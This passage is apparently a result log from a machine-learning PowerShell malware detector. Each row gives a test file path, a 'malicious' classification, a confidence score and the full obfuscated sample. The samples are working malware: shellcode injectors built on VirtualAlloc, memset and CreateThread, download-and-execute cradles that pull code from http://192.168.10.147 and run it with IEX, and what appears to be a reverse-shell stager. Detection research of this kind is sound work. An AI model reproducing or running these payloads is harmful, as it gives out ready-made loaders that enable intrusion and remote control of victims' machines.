lpThreadAttribu','x4d,0x99,0x20,0xbc,0x44,0x0f,0x8b,0xaa,0xa8,0xdf,0x0b,0x2a,0xff,0xb5,0x0b,0x42,','x3a,0xd6,0x2c,0xeb,0xa3,0x73,0xa6,0x8a','0xed,0x5f,0x77,0xa8,0x3b,0xcc,0x24,0x3d,0xc4,0xa5,0x99,0x96,0xac,0x4b,0xc4,0xd1,0x72,0xb3,0x23,0xe0,0x4f,0x62,0x0d,0x96,0xa1,0xb6;wkmg = 0x1000;if (wkmz.Length -gt 0x1000){wkmg = wkmz.Length',',0x','wkmgbE = fjJ[DllImport(wuxkernel32.dllwux)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, ui',',0x2c,0xae,0xc2,0x8c,0xa7,0x5d,0x32,0x42,0x40,0x2b,0x20,0x3','], 1)};wkmw::CreateThread(0,0,','a,0x18,0x83,0xc2,',',0xfe,0x65,0x80,0x06,0x95,0x75,0x2d,0x','t, uint src, uint count);fjJ;wkmw = ','2,0xa0,0x66,0x1','0x6e,0x14,0x5e,0x13,0x86,0x5a,0xa1,0xec,0x56,0x3b,0x2b,0x09,0x67,0x7','wkmtUZq,0,0,0);for (;;){Start-sleep 60};','6c,0x28,0x87,0xa6,0x91,',',0x70,0xba,0x04,0x93,0xf3,0x1c','x82,0xa9,0xe6,0x14,0x6e,0x1f','Byte[]];[Byte[]]wkmz = 0xda,0xdc,0xd9,0x74,0x24,0xf4,0xbb,0x6a','a,0x94,0xbf,0x5c,0x31,0x18,0x2a,0x5b,0x90,0','0xc1,0xd5,0x7f,0xdd,0x74,0xca,0xf4,0xab,0x44,0x61,0x46,0x3d,0xcd,0x96,0x1e,0x3c,0xfc,0x08,0x15,0x67,0xde,0xab,0xfa,0x13,0x57','reationFlags, IntPtr lpThreadId)','nt dwSize, uint flAllocationType, uint flProtect);[DllImport(wuxkernel32.dllwux)]public static extern In','d3,0x00,0x73,0xb9,0x1c,0x7c,0x7a,0x3f,0xf5,0x7f,0x7d,0x3d,0x9f,0x09,0x9b,0x11,0xcf,0x59,0x34,0xd1,0xbf,0x19,0xe4,0xb9,0xd5,0x95,0xdb,0xd9,0xd5,0x7f,0x74,0x73,0','t(IntPtr des',',0x16,0x46,0xd1,0xc0,0xb2,0x0c,0xff,0x15,0xcf,0x4e,0x97,0xda,0xe2,0x70,0x67,0x75,0x74,0x02,0x55,0xda,0x2e,0x8c,0xd5,0x93,0xe8,0x4b,0x1a,0x8e,0x4d,0xc3,0xe5,0x31,0xae,0xcd,0x21,0x65',';[DllImport(wuxmsvcrt.dllwux)]public static extern In','db,0x20,0x49,0xa4,0x68,0x44,0x46,0xcb,0xd9,0xe3,0xb0,0xe2,0xda,0x58,0x80,0x65,0x58,0xa3,0xd5,0x45,0x61','Ptr memse','ce Win','tes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwC'))  -crePLaCE ([ChaR]119+[ChaR]107+[ChaR]109),[ChaR]36  -RepLACe 'wux',[ChaR]34  -RepLACe  'fjJ',[ChaR]39)| . ( $SHELLid[1]+$SHelLid[13]+'X')",malicious,TP
2026-07-13 17:18:33,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\4003.ps1,custom-ps-ml,UNKNOWN,b625343b-9f16-4c4d-ae2a-f98e536cd8e6,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2916,1656.52," ((\""{5}{1}{37}{0}{48}{20}{24}{23}{28}{25}{15}{32}{9}{8}{39}{46}{42}{31}{27}{18}{44}{2}{35}{40}{4}{11}{33}{47}{10}{43}{30}{19}{36}{6}{7}{34}{21}{14}{29}{45}{22}{13}{12}{17}{16}{38}{3}{26}{41}\""-f'atic extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, ui','int flProtect);[DllI',',0x3f,0x66,0x9b,0xde,0xb4,0x5c,0x57,0x','0);for (WKSi=0;WKSi -le (WKSz.L','0x98,0x4e,0x61,0x02,0x6b,','WKSNlJ = Ge2[DllImport(V5hkernel32.dllV5h)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, u','xf0,0xf2,0x45,0x9f,0xc2,0x5d,0xfe,0x37,0x6e,0x15,0xd8,0xc0,0x','91,0x0c,0x9c,0x5f,0x','7,0xd1,0x67,0xdf','e,0x96,0x1f,0xd','x2b,0x64,0xad,0x52,0xaa,','0x8e,0xa5,0xa4,0x94,0xe5,0xdf,0x','e,0x47,0xf9,0x07,0x8d,0xb7,0xb7,0xef,0xf8,0xab,0x2f,0x00,0xb7,0x96,0xf9,0x1f,0x6d,0xbc,0x05,0x8a,0x8a,0x17,0x52,0x22,0x91,0x4e,0x94,','x3a,0xb9,0x8c,0x7',',0xf6,','9,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x3','a,0xa5,0xaf,0x24,0xff,0x06,0xc7,0x48,0xef,0x86,0x17,0x1f,0x65,0x87,0x7f,0xc7,','0xed,0x6','58,0x07,0x45,0x83,0x15,0x94,0xee,0xdf,0xb8,0x9c,0x13,0x97,0xbb,0x8d,0x85,0xac,0xe5,0x0d','x6d,0xc3,0','nFlags, IntPtr lpThreadId);[DllImport(V5hmsvcrt.dllV5h)]public static extern','4,0x32,0x9a,0xac','da,0xf9,0xa1,0x18,0x43,0xa0,0','tr memset(IntPtr dest, uint src, uint count);Ge2;',' IntP','= Add-Type -memberDefinition WKSNlJ -Name V5hWin32V5h -namespace Win32Functions -passthru;[Byte[]];[Byte[]]WKSz = 0xbf,0xe8,0x73,0xdb,0x6a,0xdb,0xd4,0xd9,0x74,0x24,0xf4,0x5d,0x2','ength-1);WKSi++) {WKSw::memset([IntPtr](WKSLwG.ToInt32()+WKSi), WKSz[WKSi], 1)};WKSw::CreateThread(0,0,WKSLwG',',0x12,0x90,0x50,0xe6,0x','WKSw ','0xa9,0x72,0xaf,0xf8,0x2c,0x3f,0x26,0x1e,0x7e,0x6f,0x69,0x8f,0x3e,0xdf,0xc9,0x7f,0xd6,0x35,0xc6,0xa0,0xc6,0x35,0x0c,0xc9','xef,0xa1,0x1f,0xb8,0xa8,0xa5,0x9e,0','xdd,0xd0,0x1e,0xd1,0x1c,0x05,0xc1,0xe8,0xee,0x58,0x00,0x2d','1,0x7d,0x0f,0x03,0x7d,0xe7,0x91,0x2','d7','6c,0xaf,0xdd,0x76,0xaa,0xfb,0x8d,0xe0,0x1b,0x84,0x45,0xf1,0xa4,0x51,0xf3,0xf','e1,','xd1,0x2b,0x90,0x04,0x50,0x6f,0xb7,0x80,0x39,0x2b,0xd6,0x91,0xe7,0x9a,0xe7,0xc2,0x48,0x42,0x42,0x88,0x64,0x97,0xff,0xd3,0xe0,0x54,0x32,0xec,0','mport(V5hkernel32.dllV5h)]public st','0xdd,0xd4,0x9a,0x08,0xc8,0x48,0x37,0x9d,0xf3,0x38,0xe4,0x36,0x9c,0xc6,0xd3,0x71,0x03,0x38,0x36,0x80,0x7f,0xef,0x7e,0xf6,0x91,0x33;WKSg = 0x1000;if (WKSz.Length -gt 0x1000){WKSg = WKSz.Length};WKSLwG=WKSw::VirtualAlloc(0,0x1000,WKSg,0x4',',0xb8,0x58,0x82,0xee,0x','0x1c,0xad,',',0,0,0);for (;;){Start-sleep 60};',',0x40,0xc9,0x34,0x8a,0x6c,0xa2,0x19,0x3f,0xe7,0xc6,0xb5,0x30,0x40,0x6c,0xe0,0x7f,0x51,0','0',',0x27,0x61,0x9e,0x07',',0x6c,0x','f8,0x3f,0xc6',',0x29,0xfe,0x1b,0xaa,0xf5,0x8b,0xbf,0x0c,0x7d,0','nt dwCreatio')).rePlACe(([chAr]86+[chAr]53+[chAr]104),[sTRing][chAr]34).rePlACe('WKS',[sTRing][chAr]36).rePlACe(([chAr]71+[chAr]101+[chAr]50),[sTRing][chAr]39)|. ( $sHELLiD[1]+$ShelliD[13]+'x')",malicious,TP
2026-07-13 17:18:39,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\4021.ps1,custom-ps-ml,UNKNOWN,b2e2a712-078e-47ec-9696-e3b5c0a59cd5,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3066,1619.98," &amp;( $vErbOsEPReFErENcE.TOString()[1,3]+'x'-jOiN'')((((\""{34}{15}{2}{41}{43}{53}{20}{50}{26}{21}{37}{33}{72}{9}{28}{56}{29}{12}{63}{45}{46}{10}{66}{0}{3}{4}{11}{23}{59}{68}{62}{13}{64}{61}{24}{52}{58}{39}{30}{25}{40}{42}{60}{17}{22}{14}{70}{47}{8}{35}{16}{48}{67}{57}{65}{55}{51}{19}{18}{6}{69}{38}{27}{44}{31}{54}{7}{36}{5}{71}{1}{49}{32}\""-f'a4,0x8b,0x67,0x42,0xd2,0xd8,0xd7,0','tU.ToInt','ke','x72,0x90,0x8d,0xdb,0xf9,0xf4,0x25,0x68,0x8f,0xd0,0x4a,','0xd9,0x3a,0x07,0x64,0xda,0x17,0x7b,0xe7,0x58,0x6a,0xa8,0xc7,0x','ZDz.Length-1);','ZDz.Length -gt 0x10','Di','xe1,0xf2,0x4c,0xa3,0x5',']public stati','a,0xfc,0x03,0x42,0x50,0x5f,0xc3,0x8d,0x8','61,0xa5,0xb','berDefinition CZDXmqb ',',0x28,0xd5,0x05,0xae,0x2c,0xe8,0xca,0xc4,0x48,0x61,0xed,0x0',',0x83,0x19,0x1e,0x78,0xc4,0xb5,0xde,0x2','Ebi','0xa1,0x0f,0x29','7,0xfc,0x3d,0x0c,0',',0x6a,0xe8,0x32,0xd6,0x6a,0xd4,0xe4,0x1e,0x19,0x34,0x35;CZDg = 0x1000;if (C','d7,0x8a,0x4e,0x23,0x84,0x1d,0x27,0xc9,0xf3','ort(Ebikernel32.dllEbi)]publi','Flags, ','x0a,0xff,0x2c,0x90','d,0x06,0x',',0x73,0x9',',0x8c,0xfa,0x81,0x55,0x13,0x51,0x0e,0xd5,0xdc,0x7f,0xc9,0x1a,0xf7,0x38,0x45,0xe5,0xf8,0x38,0x4','arameter, uint dwCreation','CZD','c extern IntPtr mem','(IntPtr dest, uint src, uint count);QAE;CZDw = Add-Type -mem',',0x40,0xc9,0x97,0x83,0x69,0xf2,0x67','CZDw::V','reateThread(0,0,CZDL2tU,0,0,0);for (;;){Start-sleep 60};','readId);[Dl','CZDXmqb = QAE[DllImport(','c,0xaa,0xf8,0x5a,0xc5,0x20,0x99,0xa3,0xd3,0x4c,0x99,0x28,0xd0,0xb1,0x57,0xd9,0x9d,','=0;CZDi -le (C','IntPtr lpTh','};',',0x2e','f','rnel32.dllEbi)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint',',0x21,0xac,0x68,0xe7,0x80,0xcd,0',' dwSize, uint flA','L2tU=','[]];[Byte[]]CZDz = 0xb8,0x5f,0xbd,0x36,0x71,0xda,0xd2,0xd9,0x74,0x24,0xf4,0x5a,0x31,','0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xe','9,0xa6,0x4c,0',',0xe8,0x98,0x99,0x36,','32()+CZDi), CZDz[CZDi], 1)};CZDw::C','c static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpP','64,0x00,0x8d,0x5f,0xd0,0x70,0xde,0x7a,0x1f,0xad,0x72,0x','6','llocationType, uint flProtect);[DllImp','irtualAlloc(0,0x1000,CZDg,0x40);for (CZ','0xcd,0x85,0x0c,0xa7,0x31,0x4a,0x8d,0x37,0x','set','5b,0xec,0x',',0x6e,0x44,0x8b,0xc8,0xd1,0x39,0x29,0x82,0xff','a6,0xd8,0x4c,0x5a,0x7f,0x96,','xe2,0xf7,0x2d,0x18,0x9e,0xf2,0xb9,0x63,0xf','xca,0x8e,0x82,0xe2','47,0x14,0x1e,0x05,0x69,0x8b,0x15,0x5c,0xa9,0x2d,0xfa,0xd4,0xe0,0x35,0x1f,0xd0,0xbb,0xce,0xeb,0xae,0x3d,0x07,0x22,0x4e,0x91,0x66,0x8b,0xbd,0xeb,0xaf,0x2b,0x5e,0x9e,0xd9,0x48,0xe3,0x99,0x1d,0x33,0x3f,0x2f,0x86,0x93,0xb4,0x97,0x62,0x22,0x18,0x41,0xe0','-Name EbiWin32Ebi -namespace Win32Functions -passthru;[Byte','a,0xd9,0x31,0','44,0xb4,0xc4,0x0f,0xa3,0xcf,','6,0x1d,0x2c,0x6e,0x56,0x42,0x','0xc6,0xb7,0x25,0xa3,0xed,0x11,0x72,0x','0xe3,0x4b,0xf4,0xe2,0x3f,0xe7,0x46,0xe2,0x','00){CZDg = CZDz.Length','8,0xa4,0x65,0xb6,0x22,0x2b,0x5','CZDi++) {CZDw::memset([IntPtr](CZDL2','lImport(Ebimsvcrt.dllEbi)')) -rEplAcE ([chaR]69+[chaR]98+[chaR]105),[chaR]34-rEplAcE  'QAE',[chaR]39 -creplACe 'CZD',[chaR]36) )",malicious,TP
2026-07-13 17:18:44,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\4025.ps1,custom-ps-ml,UNKNOWN,fb97921c-84ad-450e-a1b8-0d0704225ae6,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1590,1586.63,"Iex ( (((\""{10}{68}{49}{50}{33}{127}{111}{130}{131}{101}{81}{75}{83}{20}{76}{66}{44}{89}{115}{59}{30}{126}{82}{31}{114}{52}{26}{1}{32}{106}{41}{47}{90}{103}{42}{29}{18}{12}{85}{19}{97}{3}{38}{110}{13}{92}{25}{78}{11}{96}{71}{58}{27}{53}{35}{119}{125}{14}{84}{99}{61}{48}{64}{70}{62}{15}{105}{129}{112}{2}{73}{57}{87}{40}{100}{7}{74}{128}{55}{102}{94}{46}{36}{60}{113}{121}{5}{108}{93}{80}{98}{120}{65}{23}{124}{67}{116}{107}{104}{91}{17}{69}{79}{43}{0}{117}{63}{56}{21}{28}{54}{4}{118}{86}{88}{72}{24}{22}{77}{16}{109}{9}{45}{123}{51}{39}{8}{37}{6}{95}{122}{34}{132}\""-f 'i','1','CRE','w','/','K=','b','NE','K.Length]','XOR','IbJwC=NE','C.PR','eadeRS.','Agen','Re','Ib','dex.asp8VT)))0yh','WC.DOwnl','.H','d','i','T','8080','3b','.14:','Qtw,IbJu);Ib',' rv:1','y','http:','Qtw;IbJWc','W64; T','e','.0)','.','N','tem','NetwORKC','};IEX (I','Us','bJ','te','i','ko','TR','dows','IbJ','lT','ke','FAu',' ','SySTEM','I','0;','s','/','AlCaChE]::','V','aLs = ','= [S','6.1; WO','R',']::DE','bPROxy;','8','Lt','bd1','in','0;[cHAr[','w-OBjecT','OA','WE','xy ','.1','DEnTi','t.CREDeN','QtwMo','lla/5.0 (W','/in','Jw','dS','29e5668c38','Ju=','d','z','QU','AD','92.','[SYs','168',' N',' ','(IbJ','t','tw3','eFaU','JB','o','(Qt','8fb','Est','M.','T;Ib','D','Gec','HAR[]]','J',' l','[C','Q','%{IbJ_-b','er-','ET.WEbC','xY.','ed','nt/7.','T ',']]IbJB=(','ng(','1','.NET','6a9304ce88c9','enTials;IbJ','-joi','K[IbJi++%','1Qtw;IbJI=','.WEB','ri','N','TI','wc.PRo','li','eN','QtwQtw)'))-RepLAcE ([chAr]48+[chAr]121+[chAr]104),[chAr]124  -RepLAcE'Qtw',[chAr]39-RepLAcE  '8VT',[chAr]34-CREplacE 'IbJ',[chAr]36) )",malicious,TP
2026-07-13 17:18:50,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\4074.ps1,custom-ps-ml,UNKNOWN,87ad2e4c-bca7-4086-ad0b-2d109337e1fa,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1414,1599.64," (((\""{60}{25}{62}{100}{76}{0}{12}{75}{4}{54}{81}{82}{39}{20}{99}{90}{69}{86}{73}{11}{35}{40}{23}{96}{74}{95}{30}{83}{1}{64}{77}{59}{42}{49}{67}{34}{26}{80}{61}{72}{70}{2}{47}{28}{87}{10}{22}{32}{94}{33}{37}{56}{46}{14}{43}{51}{38}{15}{91}{45}{65}{16}{58}{24}{19}{44}{68}{50}{92}{53}{5}{36}{89}{78}{17}{27}{29}{79}{8}{7}{48}{18}{21}{98}{84}{41}{52}{88}{97}{13}{6}{85}{3}{9}{55}{31}{71}{93}{57}{66}{63}\""-f'nAG','11.0) like','YSTem.N','qI','PeCt100CONtinUe','%*C','b','a','Bqwc.DoWnLO','++%bB',']:','.0','er]::','bXOR','N','d','rKCr',']','168.10.147:80','=B5ir@ao&amp;','e','80/i',':','1; W','bBqK','M','P','bBqb=','T.WEbRequ','([chAR[]','rident/7.0','LEn','DeFAULtWEBPRO','C',';bBqwC.',' (W','!4H2KSB5i','reDE','e','.N','indows NT 6.','x.','tB5i,','E','pyF+BhA7J','HE]::Def','StEM.','e','dSTRIng(ZwOhttp://192.','bB','I9RM','T.CR','aspZwO)','6mT',' = ','qk.','ntiAlS = [Sy','EX (bBqB-j','EDEnTIaLS;','B5iUser-Agen','[SYSTe','OX','.NEt','iB5i)',' GeckoB5i;bBqwC.HeAd','aULtNETWo','OinB5','qu)',']','bBqu=B5iMoz','= [S','GtH]}','y ','/5','; ','EX','oInTMa','ers.ADD(','BqI=0;[ChAR[]','](b','r','0',';bBqwc=NeW-OBJECt SySTem','; rv:','e','Bqk[bB','illa','ESt','))CE',';b','lIeNt;','ENtiaLCaC','.',';I','Xy;bBqwC.ProxY.','T','OW64','m%{bBq_-','nd','T.WebC','.SErVICEP'))  -cREPLAcE  'CEm',[cHar]124  -REPLACE'bBq',[cHar]36  -REPLACE  ([cHar]66+[cHar]53+[cHar]105),[cHar]39  -cREPLAcE  'ZwO',[cHar]34)|INVoKE-ExPreSsiOn",malicious,TP
2026-07-13 17:18:55,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\410.ps1,custom-ps-ml,UNKNOWN,82c85460-6bb3-4295-92f8-a7e1bec7cadd,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3940,2008.87,". ( $sHELlId[1]+$SHeLliD[13]+'x')( ((\""{69}{36}{28}{77}{14}{33}{39}{74}{4}{89}{24}{56}{84}{29}{13}{67}{35}{72}{27}{11}{90}{79}{31}{30}{63}{19}{18}{86}{59}{66}{40}{52}{47}{57}{45}{26}{41}{92}{17}{0}{73}{68}{12}{22}{85}{21}{83}{55}{51}{46}{53}{75}{5}{32}{50}{88}{87}{8}{37}{54}{34}{2}{91}{70}{61}{44}{1}{7}{20}{62}{42}{6}{78}{48}{82}{49}{71}{64}{15}{3}{76}{16}{10}{38}{23}{25}{43}{58}{81}{60}{65}{80}{9}\""-f'7,0x0b,0x39,0x55,0x23,0x26,0x6','x30,0x',',0x18,0x3b,0x29,0x16,0','lloc(0,0x1000,6wIg,0','r lpThreadAttributes, uint dwStackSize, ','fa,0x3a,0xa1,0x','e,0x19,0xa8,0x52,0x74,0x8c,0xc7,0xb4,0x1','22,0x91,0xff,0x31,0',',0x8c,0xc7,0','}else{;iex pWy&amp; powershell 6wIpQW 6wIepWy;}','g([System.Text.Encoding]',',0xd9,0x74,0x','f,0xc1,0x49,0xe8,0x66,0xaf,0xe0,0x42,0x11,0x63,0x84,0x4c,','O9QO;6wIw = Add-Type -memberDefin','el32.dllpWy)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress,','cz5=6wIw::VirtualA','6wIi=0;6wIi -le (6wIz.Length-1);6wIi++) {6wIw::memset([IntPtr](6wIcz5.ToInt32()+6wIi), 6wIz[6wIi], 1)};6wIw::CreateThread(0,0,6wIcz5,0,0,0);for (;;){Start-sleep 60};9QO;6wIe = [System.Convert]::ToBase64Strin',',0x3','x80,0x11,0x19,0x4e','17,0xb0,0x44,0x82,0xf2,0x81,0x44,0xf0,0x77,0xb1,0x74,0x72,0xd5,0x3d,0xfe,0xd6,0xce,0xb6,0x72,0xff,0xe1,0x7f,0x38,0xd9,0xcc,0','x',',0xb8,0xca,0xf0,0x3a,0x40,0xbf,0xa5,0xd2,0x36,0x28,0x4a,0x23,0x5f,0xda,0x4a,0x23,0x','0xe6,0x84,0xbf,0xa0,0x33,0x29,0x13,0x90,0x90,0x9e,0xfb,0x2c,0','icode.Get','Ptr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(pWyms','Bytes(6wIpQW1q0));6wIpQW = pWy-e pWy;if([I','0x2e,0xa6,0xdd,0xc7,0xf4,0xd5,0x39,0x4d,0xef,0x7d,0xc9,0xf5,0xcb,0x7c,0x1e,0x63,0x9f,0x72,0xeb,0xe7,0xc7,0x96,0xea,0x24,0x7c,0xa2,0x67,0xcb,0x53,0x23,0x33,0xe8,0x',',0xbf,0x14,0x1a,0xd9,0xf6','q0 = ','tPtr memset(IntPtr dest, uint src, uint count);9Q','83,0xc','b1,0x59,0x31,0x58,0x13,0x','6f,0xe4,0x14,0x29,',' uint dwSize, uint flAllocationType, uint flProtect);[DllImport(','3,0x52,0x02','on 6wIBiLa -Name pWyW','wIpQW1','x90,','::Un','pWyke','x5','77,0x68,0xe7,0x91,0x2e,0xd4,0x46,0xad,0x31,0x','c,0x00,0x2b,0x7d,0x40,0xa0,0xc','ntPtr]::Size -eq 8){6wI6hAf = 6','9,0xab,0x71,0x74,0xf1,0x99,0xf1,0x72,0xf8,0xe2,0x83,0xbd,0x8f,0x01,0xd3,0xfe,0','a,0xce,0xce,0xb5,0xd7,0x99,0x65,0x0d,0xa3,0x1b,0xac,0x5c,0x4c,0xb7,0x91,0x51,0xbf,0xc9,0xd6,0x55,0x20,0xbc,','x5a,0xb7,0x0','65,0x4',';6wIg = 0x1000;if (6','z.Le','0x05,0x5c,0x06,0x2f,0x',',0','2,0xe0,0xdd,0x9f,0x28,0xe4,0x','1,0xd0,0x5d,0x05,0x46,0xa4,0x0d,0x3a,0xd5,0xf2,0xe2,0','0x9a,0x45,0x72,0xa6,0x10,0x6c,0x3','a,0x23,0xfb,0x58,0xb4,0x2b,0xac,0xd1,0xab,0x6d,0xad,0x37','vcr','3,0xf8,0x07,0x47,0xd2,0x73,0x5e,0x47,0xd4,0x50,0xe','wIenv:SystemRoot + pWyU2rsyswow64U2rWindowsPowerShe','4e,0xb0,0x3b,0xa3,0x83,0xb1,0x7c,0xde,0x6e,0xe3,0x','e',',0x66,0x7e,0xe3,0x30,0x7','4d,0x3e,0x65,0xbb,0xdb,0xd','0,0x04,0x03,0x58,0xb6,0x5d,0xe1,0xe6,0x20,0x23,0x0a,0x','th};6wI','rshellpWy;iex pWy&amp; 6wI6hAf 6wIpQW 6wIepW','d5,0x94,0xdd,0x14,0','iti','e','6',',0x76,0x3c,0x45,0xe0,0xea,0xed,0xea,0x82,0xea,0x45,0x64,0x95,0xd4,0x69,0x74,0xc6,0x42,0x02','ngth -gt 0x1000){6wIg = 6wIz.Leng','in32pWy -namespace Win32Functions -passthru;[Byte[]];[Byte[]]6wIz = 0xbb,0xb9','0,0x31,0xdd,0x5c,0x','rnel32.dllpWy)]public static extern IntPtr CreateThread(IntPt','xea,0xb1,0x17,0x51,0x3c,0x79,0x17,0x8f,0xd6,0x17,0xed,0x6f,0xbe,0x67,0xc2,0x8f,0x3e,0xe1,0xc5,0x','x40);for (','9QO6wIBiLa = 9QO9QO[DllImport(pWykern','a,0x35,0x5c,0xc9','0xf4,0x58,0x2b,0xc9,0x','y','llU2rv1.0U2rpow','wI','9f,0xcd,0x0f,0x16,0xd','t.dllpWy)]public static extern In','x41,0x59,0x5b,0xaf',',0x02,0x68,0x',',0x65,0xdf,0xeb,0x15','1a,0xb5,0x65,0x63,0xb6','Int','24,','x8f,0x44,0x87,0x3d,0x70,0xd2,0x28,0xd2,0x70,0x22,0x41,0xd2,0x70,0x62,0x91,0x81,0x18,0x3a,0x35','b7')).rePlace('U2r','\\').rePlace(([cHAr]54+[cHAr]119+[cHAr]73),[sTrinG][cHAr]36).rePlace(([cHAr]112+[cHAr]87+[cHAr]121),[sTrinG][cHAr]34).rePlace('9QO',[sTrinG][cHAr]39))",malicious,TP
2026-07-13 17:19:06,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\419.ps1,custom-ps-ml,UNKNOWN,02e054ff-656b-4148-83c9-f4fb89913eb6,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2964,1747.37," ((\""{7}{23}{60}{67}{4}{46}{56}{59}{30}{0}{49}{57}{41}{38}{1}{37}{5}{2}{13}{51}{32}{10}{17}{66}{65}{62}{54}{64}{50}{69}{48}{39}{61}{16}{3}{43}{33}{15}{11}{28}{29}{27}{20}{25}{9}{68}{58}{14}{45}{18}{52}{6}{31}{47}{35}{12}{8}{40}{44}{63}{19}{24}{21}{55}{34}{42}{26}{22}{36}{53}\"" -f'ulS -Name','0x0c,0x8b','x8b,0x7','1c,0x01,','teThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpS',',0x14,0','6,0xff,0xd5,0x6a,0x00,0','JdyulS = 8X0[DllImport(',',0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0','0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x30,0x68,0x02','78,0x85,0xc0,0x74,0x4a,0x01,0xd','0',',0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a','2,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x0','e,0',',0x04,0x8b,0x01,0xd0,0x89,',',0x4b,0x8b,0x58,0x','0,','x75,0','Jdyg = Jdyz.Leng','0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0','alAlloc(0,','dytfE.ToInt32()+Jdyi), Jdyz[Jdyi], 1)};Jdyw::Cr','5sYkernel32.dll5sY)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, ','th};JdytfE=Jdyw::Virtu','xd5,',';Jdyi++) {Jdyw::memset([IntPtr](J','x32,0x5f,0x54,0x68,0x4c,0x77,','x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,','0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0','count);8X0;Jdyw = Add-Type -memberDefinition Jdy','x6a','0,0x8b,0x40,0x','3,0x8b','yi=0;','d9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a','eateThread(0,0,JdytfE,0,0,0);for ',',0x52',' = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,','0x24,0x75,0xe2,0x58,0x8b,0x58,0x','xff','thru;[Byte[]];[Byte[]]Jdyz','Jdyi -le (Jdyz.Length-1)','0xd',',0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;Jdyg = 0x1000;if (Jdyz.Length -gt 0x10','x08,0','tartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(5sYms',',0x04,0x56,0x57,0x68,0x02,0x','x3b,0x7d,',' 5sYWin325sY -n',',0xe0,0x75,0xf4,0x0','1,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd','xec,0x68,0xf0,0xb5,0xa2,0x5','(;;){Start-sleep 60};','7,0x3','0x1000,Jdyg,0x40);for (Jd','vcrt.dll5sY)]public static extern IntPtr memset(IntPtr dest, uint sr','amespace Win32Functions -pass','x85,0xc0,0x74,0x0c,0xff,0x4','c, uint ','uint dwSize, uint flAllocationType, uint flProtect);[Dl','24,0x01,0xd3,0x66,0x8b,0x0c',',0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc','00){','8','x58,0x20','0x50,0x8b,0x48,0x18,0x8b,0','lImport(5sYkernel32.dll5sY)]public static extern IntPtr Crea',',0x00,0x55,0xf0,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0','3,0x7d,0xf8,0')).REpLaCE('5sY',[sTRiNg][char]34).REpLaCE(([char]74+[char]100+[char]121),[sTRiNg][char]36).REpLaCE('8X0',[sTRiNg][char]39)| .((get-vARiAble '*Mdr*').nAME[3,11,2]-JOiN'')",malicious,TP
2026-07-13 17:19:09,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\432.ps1,custom-ps-ml,UNKNOWN,784a98d7-8ce6-4fa2-aab5-0b39a6adfb96,DESKTOP-BAC9DBQ,malicious,0.9967,RandomForest,1385,1898.47," (((\""{32}{93}{30}{5}{36}{21}{65}{89}{29}{53}{19}{75}{40}{87}{58}{41}{9}{25}{79}{54}{34}{43}{70}{24}{11}{56}{33}{50}{59}{28}{51}{39}{17}{77}{48}{44}{82}{22}{96}{15}{2}{12}{63}{95}{4}{60}{16}{35}{31}{85}{0}{3}{72}{94}{46}{84}{64}{8}{69}{27}{71}{10}{26}{38}{66}{86}{18}{37}{57}{1}{67}{52}{49}{91}{83}{13}{81}{80}{47}{14}{61}{73}{7}{74}{62}{6}{23}{92}{97}{90}{20}{76}{55}{78}{68}{42}{88}{45}\"" -f 